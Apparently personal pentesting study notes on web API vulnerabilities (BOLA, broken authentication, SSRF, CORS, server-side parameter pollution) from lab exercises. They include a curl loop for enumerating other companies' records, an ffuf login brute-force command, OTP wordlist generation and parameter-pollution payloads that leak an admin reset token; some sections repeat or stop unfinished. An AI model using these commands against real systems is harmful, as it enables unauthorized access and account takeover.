

Web API's can be built using various architectural styles , including , REST, SOAP, GraphQL, and gRPC, each with its own strengths and use cases.

- - [Representational State Transfer](https://roy.gbiv.com/pubs/dissertation/fielding_dissertation.pdf#:~:text=This%20chapter%20introduces%20and%20elaborates%20the%20Representational%20State%20Transfer) (`REST`) is the most popular API style. It uses a `client-server` model where clients make requests to resources on a server using standard HTTP methods (`GET`, `POST`, `PUT`, `DELETE`). `RESTful` APIs are stateless, meaning each request contains all necessary information for the server to process it, and responses are typically serialized as JSON or XML.
- [Simple Object Access Protocol](https://www.w3.org/TR/2000/NOTE-SOAP-20000508/) (`SOAP`) uses XML for message exchange between systems. `SOAP` APIs are highly standardized and offer comprehensive features for security, transactions, and error handling, but they are generally more complex to implement and use than `RESTful` APIs.
- [GraphQL](https://graphql.org/) is an alternative style that provides a more flexible and efficient way to fetch and update data. Instead of returning a fixed set of fields for each resource, `GraphQL` allows clients to specify exactly what data they need, reducing over-fetching and under-fetching of data. `GraphQL` APIs use a single endpoint and a strongly-typed query language to retrieve data.
- [gRPC](https://grpc.io/) is a newer style that uses [Protocol Buffers](https://protobuf.dev/) for message serialization, providing a high-performance, efficient way to communicate between systems. `gRPC` APIs can be developed in a variety of programming languages and are particularly useful for microservices and distributed systems.
------------

# Broken Object Level Authorization

BOLA (CWE-639) occurs when an API validates that a user is _authenticated_, but fails to verify they are _authorized_ to view the specific requested resource ID.

**Core Concept:** BOLA (CWE-639) occurs when an API validates that a user is _authenticated_, but fails to verify they are _authorized_ to view the specific requested resource ID.

**The Exploitation Workflow:**

1. **Authenticate:** Obtain a JWT via the login endpoint and map it to your session.

2. **Profile Yourself:** Hit endpoints like `/current-user` to map your own privileges (e.g., your assigned `companyID` Guid and specific roles).

3. **Find the Parameter:** Locate endpoints requiring roles you possess that take a predictable identifier. In this scenario, `/yearly-reports/{ID}` takes a sequential integer, making it highly predictable compared to a UUID.

4. **Manipulate the Key:** Swap the ID to a number outside your assigned scope. If the API returns another company's data (a mismatched `companyID`), you have successfully bypassed object-level authorization.


**Mass Exploitation (CLI Automation):** You can rapidly enumerate vulnerable endpoints without heavy tools by wrapping a `curl` request in a simple Bash loop and piping to `jq` for clean JSON formatting:

`for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET' 'http://TARGET_IP/api/v1/supplier-companies/yearly-reports/'$i'' \ -H 'Authorization: Bearer <JWT>' | jq done`



# Broken Authentication




### Broken Authentication (API2)

**Core Concept:** Broken Authentication (CWE-307) occurs when an API fails to securely restrict login attempts, manage sessions, or enforce strong password policies, allowing an attacker to bypass the authentication mechanism entirely.

**The Exploitation Workflow (Brute-Forcing):**

1. **Analyze Password Policies:** Observe the API's behavior when updating passwords or failing logins. If it only requires a minimum length (e.g., 6 characters) and lacks complexity requirements, users likely have weak passwords.

2. **Identify the Failure State:** Determine exactly what the API returns upon a failed login (e.g., `"Invalid Credentials"`).

3. **Target Acquisition:** Use information exposure vulnerabilities (like excessive data exposure on a `/customers` endpoint) to compile a list of valid target emails.

4. **Brute-Force:** Attack the sign-in endpoint using a tool like `ffuf` to blast combinations of targeted emails and a password list (like `xato-net-10-million-passwords-10000.txt`).


**Automating with `ffuf` (Multiple Parameters):** You can fuzz multiple parameters simultaneously (e.g., username and password) by using multiple `-w` (wordlist) flags and assigning them keywords:


`ffuf -w /path/to/passwords.txt:PASS -w /path/to/emails.txt:EMAIL \`
`-u http://TARGET_IP/api/v1/authentication/customers/sign-in -X POST \`
`-H "Content-Type: application/json" \`
`-d '{"Email": "EMAIL", "Password": "PASS"}' \`
`-fr "Invalid Credentials"`


**Alternative Attack Vectors:** If strict password policies are in place, look for weak password reset flows:

- **Brute-forcing OTPs:** 4 or 6-digit One Time Passwords have very low entropy (10,000 to 1,000,000 combinations) and can be brute-forced rapidly if rate limiting is absent.

- **Security Questions:** Answers are often guessable via open-source intelligence (OSINT) or have low entropy (e.g., "What is your favorite color?").
    
**Remediation (Interview Answer):** A robust API authentication system requires a defense-in-depth approach:

1. **Rate Limiting:** Restrict the number of failed login or OTP attempts per IP address and per user account within a specific timeframe to mathematically defeat brute-forcing.

2. **Strong Password Policies:** Enforce complexity (length, character types) and check against known breached password databases (e.g., Have I Been Pwned API) during registration and password changes.

3. **Multi-Factor Authentication (MFA):** Require a secondary, time-sensitive verification method (like a TOTP app or hardware token) before granting access.

---------------
LAB

here we created a custom wordlist from 0-9999 and found the OTP 

The syntax for `crunch` follows a strict positional format: `crunch <min-length> <max-length> <character-set>`.

In the command **`crunch 4 4 0123456789`**:

- **`4` (Minimum Length):** The shortest string crunch will generate.

- **`4` (Maximum Length):** The longest string crunch will generate. By setting both the minimum and maximum to 4, you force it to generate _exactly_ 4-character strings.

- **`0123456789` (Character Set):** The exact pool of characters crunch is allowed to use.

Because of these parameters, the tool will start at `0000` and iterate through every possible combination up to `9999`, outputting exactly 10,000 lines.

### Useful Variations to Know

- **`crunch 6 6 0123456789`** $\rightarrow$ Generates all 6-digit OTPs or PINs (`000000` to `999999`).

- **`crunch 4 4 ABC`** $\rightarrow$ Generates 4-letter combos using only A, B, and C (`AAAA`, `AAAB`, `AAAC`, etc.).

- **`crunch 1 3 012`** $\rightarrow$ Generates variable lengths ranging from 1 to 3 characters (`0`, `1`, `2`, `00`, `01`... up to `222`).

An other way to do this was to send the request to intruder and fuzz it but it would have taken much longer 


![[Pasted image 20261003152713.png]]

---------------

# Broken Object Property Level Authorization



`Broken Object Property Level Authorization` is a category of vulnerabilities that encompasses two subclasses: `Excessive Data Exposure` and `Mass Assignment`.

An API endpoint is vulnerable to `Excessive Data Exposure` if it reveals sensitive data to authorized users that they are not supposed to access.

On the other hand, an API endpoint is vulnerable to `Mass Assignment` if it permits authorized users to manipulate sensitive object properties beyond their authorized scope, including modifying, adding, or deleting values.


## Exposure of Sensitive Information Due to Incompatible Policies

![[Pasted image 20261003153602.png]]


![[Pasted image 20261003153612.png]]


## Improperly Controlled Modification of Dynamically-Determined Object Attributes



# Broken Object Property Level Authorization


`Broken Object Property Level Authorization` is a category of vulnerabilities that encompasses two subclasses: `Excessive Data Exposure` and `Mass Assignment`.

An API endpoint is vulnerable to `Excessive Data Exposure` if it reveals sensitive data to authorized users that they are not supposed to access.

On the other hand, an API endpoint is vulnerable to `Mass Assignment` if it permits authorized users to manipulate sensitive object properties beyond their authorized scope, including modifying, adding, or deleting values.


## Exposure of Sensitive Information Due to Incompatible Policies


The first endpoint we will be practicing against is vulnerable to [CWE-213](https://cwe.mitre.org/data/definitions/213.html), `Exposure of Sensitive Information Due to Incompatible Policies`.

### Scenario

The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester4@hackthebox.com:HTBPentester4`, wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

After invoking `/api/v1/authentication/customers/sign-in` to sign in as a customer and obtain a JWT, the `/api/v1/roles/current-user` endpoint shows that we have the roles `Suppliers_Get` and `Suppliers_GetAll`


## Improperly Controlled Modification of Dynamically-Determined Object Attributes


The second API endpoint we will be practicing against is vulnerable to [CWE-915](https://cwe.mitre.org/data/definitions/915.html), `Improperly Controlled Modification of Dynamically-Determined Object Attributes`.

# Unrestricted Resource Consumption


File upload and download are fundamental features in all applications. For instance, in e-commerce marketplaces, suppliers require the ability to upload product images, while users need to view and download these files.

A web API is vulnerable to `Unrestricted Resource Consumption` if it fails to limit user-initiated requests that consume resources such as `network bandwidth`, `CPU`, `memory`, and `storage`. These resources incur significant costs, and without adequate safeguards—particularly effective `rate-limiting`—against excessive usage, users can exploit these vulnerabilities and cause financial damage.



# Broken Function Level Authorization


A web API is vulnerable to `Broken Function Level Authorization` (`BFLA`) if it allows unauthorized or unprivileged users to interact with and invoke privileged endpoints, granting access to sensitive operations or confidential information. The difference between `BOLA` and `BFLA` is that, in the case of `BOLA`, the user is authorized to interact with the vulnerable endpoint, whereas in the case of `BFLA`, the user is not.


# Unrestricted Access to Sensitive Business Flows

All businesses operate to generate revenue; however, if a web API exposes operations or data that allows users to abuse them and undermine the system (for example, by buying goods at a discounted price), it becomes vulnerable to `Unrestricted Access to Sensitive Business Flows`. An API endpoint is vulnerable if it exposes a sensitive business flow without appropriately restricting access to it.


# Server Side Request Forgery


A web API is vulnerable to `Server-Side Request Forgery` (`SSRF`) (also known as `Cross-Site Port Attack` (`XPSA`)) if it uses user-controlled input to fetch remote or local resources without validation. SSRF flaws occur when an API fetches a remote resource without validating the user-supplied URL. This allows an attacker to coerce the application to send a crafted request to an unexpected destination (especially local ones), bypassing firewalls or VPNs.


## Server-Side Request Forgery (SSRF)

The endpoint we will be practicing against is vulnerable to [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html).




**CORS (Cross-Origin Resource Sharing)** is a security feature built into web browsers, and the **`Access-Control-Allow-Origin`** header is the main switch that controls it.

Here is the breakdown of how they work and why they matter for your interview.

### 1. What is CORS?

By default, web browsers enforce the **Same-Origin Policy (SOP)**. SOP prevents a JavaScript file hosted on `evil-hacker.com` from making a request in the background to `your-bank.com` and reading your account balance.

However, modern web apps _need_ to share resources across different domains (e.g., `frontend-app.com` needs to pull data from `api-backend.com`). **CORS** is the protocol that allows servers to safely bypass the Same-Origin Policy and tell the browser, _"It is okay for this specific outside domain to read my data."_

### 2. What is `Access-Control-Allow-Origin`?

When a browser makes a cross-origin request, it includes an `Origin` header stating where the request came from (e.g., `Origin: [https://frontend-app.com](https://frontend-app.com)`).

The server replies with the **`Access-Control-Allow-Origin`** header to tell the browser who is allowed to read the response.

There are three common ways servers configure this header:

- **Strict (Secure):** `Access-Control-Allow-Origin: [https://frontend-app.com](https://frontend-app.com)` (Only this exact domain can read the data).
    
- **Wildcard (Public):** `Access-Control-Allow-Origin: *` (Any website on the internet can read this data. This is fine for public weather APIs, but dangerous for private data).
    
- **Dynamic (Potentially Vulnerable):** The server reads the user's `Origin` header and blindly echoes it back.
    

### 3. Why Pentesters (and Interviewers) Care

A **CORS Misconfiguration** happens when a server trusts any origin dynamically and allows credentials (cookies/sessions) to be sent.

If you send a request in Burp Suite with: `Origin: [https://evil.com](https://evil.com)`

And the server responds with:



# Server-Side Parameter Pollution (SSPP)


The front-end takes your input and inserts it into a URL that the server calls internally. If the server doesn't sanitize, you can inject your own parameters.


![[Pasted image 20261005094557.png]]

##  Attack Techniques

### 1. Truncating (`%23` = `#`)


Inject `#` to cut off everything after your input.

`name=peter%23foo`
`→ /users/search?name=peter#foo&publicProfile=true`

Everything after `#` is ignored → **`publicProfile=true` is removed.**


**Why it matters:** You can bypass the `publicProfile=true` restriction and maybe see private profiles.


**Note:** Must URL-encode `#` as `%23`, or the browser treats it as a fragment and never sends it.



### 2. Injecting Invalid Params (`%26` = `&`)


Add a fake parameter to test if it's parsed.

`name=peter%26foo=xyz`
`→ /users/search?name=peter&foo=xyz&publicProfile=true`

If response is unchanged → the server accepted `foo` but ignored it. Good sign — keep going.

### 3. Injecting Valid Params


If you found a real param name (e.g. `email` from hidden param discovery):

`name=peter%26email=foo`
`→ /users/search?name=peter&email=foo&publicProfile=true`


Watch how the response changes — this tells you how the API handles injected params.


### Overriding Params

Send the **same param twice** with your own value.


`name=peter%26name=carlos`
`→ /users/search?name=peter&name=carlos&publicProfile=true`

**Behavior by tech stack:**


|Stack|Result|
|---|---|
|**PHP**|Uses **last** → searches `carlos`|
|**[ASP.NET](https://asp.net/)**|Combines → `peter,carlos` → error|
|**Node/Express**|Uses **first** → still `peter`|

**Why it matters:** If it uses the last value → inject `name=administrator` → **log in as admin.**


## Key Notes to Remember

- `%23` = `#` → **truncate** the query

- `%26` = `&` → **inject** a new parameter

- `%3D` = `=` → part of a parameter pair

- Always **URL-encode** special chars

- Test same-name params to see **which wins** (first/last/combined)

- Goal: **truncate restrictions** or **override values** (like `name=admin`)

- Behavior depends on backend language — always test



# Server-Side Parameter Pollution (SSPP) — Cheat Sheet

## Core Concept
Frontend inserts your input into an internal API URL.
You inject extra params to change the internal request.

Example:
You send:   GET /userSearch?name=peter&back=/home
Server calls: GET /users/search?name=peter&publicProfile=true

--------------------------------------------------

## Key URL-Encoded Characters
%23 = #   → truncate the rest of the query
%26 = &   → inject a new parameter
%3D = =   → part of a parameter pair

--------------------------------------------------

## Attack Techniques

### 1. Truncation (#)
Payload:   name=peter%23foo
Internal:  /users/search?name=peter#foo&publicProfile=true
Effect:    Removes publicProfile=true → may show private profiles
Note:      Must URL-encode # as %23 or browser treats it as fragment

### 2. Inject Invalid Param (&)
Payload:   name=peter%26foo=xyz
Internal:  /users/search?name=peter&foo=xyz&publicProfile=true
Effect:    If response unchanged → param parsed but ignored (good sign)

### 3. Inject Valid Param (&)
Payload:   name=peter%26email=foo
Internal:  /users/search?name=peter&email=foo&publicProfile=true
Effect:    Observe response changes

### 4. Override Existing Param (&)
Payload:   name=peter%26name=carlos
Internal:  /users/search?name=peter&name=carlos&publicProfile=true
Effect:    Depends on backend:
 - PHP: uses LAST → carlos
 - ASP.NET: combines → peter,carlos → error
- Node/Express: uses FIRST → peter

--------------------------------------------------

## Real Lab Exploit (Password Reset Token Leak)
Endpoint:  POST /forgot-password
Payload:   username=administrator%26field=reset_token%23
Decoded:   username=administrator&field=reset_token#
Internal:  /api?username=administrator&field=reset_token#&field=email
Result:    Returns admin's reset_token

Why it worked:
- %26 injected new field=reset_token
- %23 truncated original field=email

--------------------------------------------------

## Finding Hidden Parameters

### Burp Param Miner (best tool)
- Right-click request → Extensions → Param Miner
- Options:
  Ctrl+Alt+Shift+F1  Guess headers
  Ctrl+Alt+Shift+F2  Guess query params
  Ctrl+Alt+Shift+F3  Guess cookies
  Ctrl+Alt+Shift+F4  Guess body params
  Ctrl+Alt+Shift+F5  Guess everything
- Needs a real request WITH at least one param already
- Check: Extensions > Installed > Param Miner > Output

### Manual Methods
- Inspect JS files for fetch/axios calls
- Look for hidden <input> fields in HTML
- Check Swagger/OpenAPI docs (/swagger, /api-docs, /openapi.json)
- GAP extension (passively collects params)
- Content Discovery extension

### Other Tools
- Kiterunner (kr) — API route discovery
- ffuf / dirsearch — path brute-force
- OWASP ZAP — free alternative to Burp Pro

--------------------------------------------------

## Common Doc Paths to Try
/swagger
/swagger-ui
/swagger-ui.html
/api-docs
/v2/api-docs
/v3/api-docs
/openapi.json
/openapi.yaml
/docs
/redoc

--------------------------------------------------

## Quick Payload Table
| Payload                | Purpose                     |
|------------------------|-----------------------------|
| peter%23foo            | Truncate rest of query      |
| peter%26foo=xyz        | Test if & is parsed         |
| peter%26email=foo      | Inject real param           |
| peter%26name=carlos    | Override param              |
| administrator%26field=reset_token%23 | Leak reset token |

--------------------------------------------------

## Key Reminders
- Always URL-encode #, &, =
- Test same-name params to see which wins (first/last/combined)
- Behavior depends on backend language (PHP/ASP.NET/Node)
- Goal: truncate restrictions OR override values
- Param Miner ≠ URL bruteforce — it needs an existing param
- trick works on URL query strings, NOT on POST body params